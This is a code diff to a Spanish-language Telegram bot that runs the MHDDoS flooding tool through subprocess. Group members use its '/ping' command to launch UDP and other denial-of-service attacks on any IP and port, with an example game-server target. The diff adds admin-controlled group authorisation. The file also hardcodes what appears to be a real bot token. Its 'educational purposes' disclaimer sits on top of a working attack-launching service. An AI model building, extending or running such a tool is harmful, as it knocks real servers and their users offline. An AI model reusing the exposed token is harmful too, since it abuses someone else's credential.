@@ -1,13 +1,13 @@
 import telebot
 import subprocess
-from threading import Lock
+import json
+import os
 import time
-import atexit
+from threading import Lock
 from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
 
 BOT_TOKEN = "7692852873:AAHQ3YtPu90LarVnzyPRd4695zPDKY8taOQ"
 ADMIN_ID = 6348583777
-GROUP_IDS = [-1002260050481, -1002282261021]
 GROUP_LINK = "https://t.me/zFerCrashGoup"  # Reemplaza con el enlace de tu grupo
 START_PY_PATH = "/workspaces/MHDDoS/start.py"
 
@@ -16,15 +16,31 @@ db_lock = Lock()
 cooldowns = {}
 active_attacks = {}
 
-@atexit.register
-def close_db_connection():
-    pass  # No hay conexión de base de datos que cerrar
+# Ruta del archivo JSON
+groups_file = "groups.json"
+
+# Verifica si el archivo de grupos existe, si no, lo crea
+if not os.path.exists(groups_file):
+    with open(groups_file, "w") as f:
+        json.dump({"groups": []}, f)
+
+def load_groups():
+    """Carga los grupos desde el archivo JSON"""
+    with open(groups_file, "r") as f:
+        data = json.load(f)
+    return data["groups"]
+
+def save_groups(groups):
+    """Guarda los grupos en el archivo JSON"""
+    with open(groups_file, "w") as f:
+        json.dump({"groups": groups}, f)
 
 def is_allowed(message):
-    """ Verifica si el mensaje proviene de un grupo permitido o del admin en privado. """
-    if message.chat.id in GROUP_IDS or (message.chat.type == "private" and message.from_user.id == ADMIN_ID):
+    """Verifica si el mensaje proviene de un grupo autorizado o si es del admin en privado."""
+    groups = load_groups()
+    if message.chat.id in groups or (message.chat.type == "private" and message.from_user.id == ADMIN_ID):
         return True
-    bot.reply_to(message, "❌ Este bot solo funciona en grupos específicos.\n🔗 Únete a nuestro grupo principal: " + GROUP_LINK)
+    bot.reply_to(message, f"❌ Este bot solo funciona en los grupos autorizados.\n🔗 Únete a este grupo: {GROUP_LINK}")
     return False
 
 @bot.message_handler(commands=["start"])
@@ -42,30 +58,14 @@ def handle_start(message):
     bot.send_message(
         message.chat.id,
         (
-            "🎉 ¡Bienvenido al Bot de Ping MHDDoS para Free Fire! 🎮\n\n"
-            "⚡ *Conéctate al grupo para acceder a funciones exclusivas de este bot.*\n"
-            "💬 Si tienes preguntas, no dudes en contactarnos por soporte técnico.\n\n"
-            "🔧 *Comando principal:* `/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
-            "⚠️ *Este bot fue diseñado para fines educativos y de prueba.*"
+            "🤖 *Bienvenido al Bot de Ping MHDDoS [Free Fire]!*\n\n"
+            "📌 *Como usar:*\n"
+            "```/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>```\n\n"
+            "💡 *Ejemplo:*\n"
+            "```/ping UDP 143.92.125.230:10013 3 120```\n\n"
+            "⚠️ *Atención:* Este bot fue creado con fines educativos."
         ),
         reply_markup=markup,
-        parse_mode="Markdown",
-    )
-
-@bot.message_handler(commands=["help"])
-def handle_help(message):
-    if not is_allowed(message):
-        return
-
-    bot.reply_to(
-        message,
-        (
-            "📘 *Comandos disponibles:*\n\n"
-            "🔹 `/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>`: Inicia un ataque.\n"
-            "🔹 `/stop`: Detiene cualquier ataque en curso.\n\n"
-            "💡 *Ejemplo de uso:* `/ping UDP 143.92.125.230:10013 3 120`\n\n"
-            "🛠 Si necesitas ayuda adicional, contáctanos a través de nuestro soporte técnico."
-        ),
         parse_mode="Markdown",
     )
 
@@ -87,7 +87,7 @@ def handle_ping(message):
             message,
             (
                 "❌ *Formato inválido!*\n\n"
-                "📌 *Uso correcto:*\n"
+                "📌 *Uso correto:*\n"
                 "`/ping <TYPE> <IP/HOST:PORT> <THREADS> <MS>`\n\n"
                 "💡 *Ejemplo:*\n"
                 "`/ping UDP 143.92.125.230:10013 3 120`"
@@ -108,20 +108,20 @@ def handle_ping(message):
         cooldowns[telegram_id] = time.time()
 
         markup = InlineKeyboardMarkup()
-        markup.add(InlineKeyboardButton("✅ Confirmar Detener Ataque", callback_data=f"stop_{telegram_id}"))
+        markup.add(InlineKeyboardButton("⛔ Parar Ataque", callback_data=f"stop_{telegram_id}"))
 
         bot.reply_to(
-    message,
-    (
-        "🔥 *Ataque Iniciado* 🔥\n\n"
-        f"📍 *IP:* {ip_port}\n"
-        f"⚙️ *Tipo:* {attack_type}\n"
-        f"🧵 *Threads:* {threads}\n"
-        f"⏳ *Duración:* {duration}ms\n\n"
-        "🤖 *Este bot fue creado por* @xFernandoh"
-    ),
-    reply_markup=markup,
-    parse_mode="Markdown",
+            message,
+            (
+                "*🔥 Ataque Iniciado 🔥*\n\n"
+                f"📍 *IP:* {ip_port}\n"
+                f"⚙️ *Tipo:* {attack_type}\n"
+                f"🧵 *Threads:* {threads}\n"
+                f"⏳ *Duración:* {duration}ms\n\n"
+                "*Este bot fue creado por @xFernandoh*"
+            ),
+            reply_markup=markup,
+            parse_mode="Markdown",
         )
     except Exception as e:
         bot.reply_to(message, f"❌ Error al iniciar el ataque: {str(e)}")
@@ -141,9 +141,9 @@ def handle_stop_attack(call):
         process.terminate()
         del active_attacks[telegram_id]
 
-        bot.answer_callback_query(call.id, "✅ Ataque detenido con éxito.")
+        bot.answer_callback_query(call.id, "✅ Ataque parado con éxito.")
         bot.edit_message_text(
-            "*[⛔] ATAQUE DETENIDO [⛔]*",
+            "*[⛔] ATAQUE PARADO [⛔]*",
             chat_id=call.message.chat.id,
             message_id=call.message.id,
             parse_mode="Markdown",
@@ -152,6 +152,32 @@ def handle_stop_attack(call):
         bot.delete_message(chat_id=call.message.chat.id, message_id=call.message.id)
     else:
         bot.answer_callback_query(call.id, "❌ Ningún ataque activo.")
+
+@bot.message_handler(commands=["addgroup"])
+def handle_addgroup(message):
+    if message.from_user.id != ADMIN_ID:
+        bot.reply_to(message, "❌ Solo el admin puede agregar grupos.")
+        return
+
+    try:
+        # Obtener ID del grupo
+        group_id = int(message.text.split()[1])
+        groups = load_groups()
+
+        # Verificar si el grupo ya está en la lista
+        if group_id in groups:
+            bot.reply_to(message, "❌ Este grupo ya está en la lista.")
+            return
+
+        # Agregar el grupo y guardar
+        groups.append(group_id)
+        save_groups(groups)
+
+        bot.reply_to(message, f"✅ Grupo {group_id} agregado correctamente.")
+    except IndexError:
+        bot.reply_to(message, "❌ Por favor, proporciona un ID de grupo válido.")
+    except ValueError:
+        bot.reply_to(message, "❌ El ID de grupo debe ser un número válido.")
 
 if __name__ == "__main__":
     bot.infinity_polling()
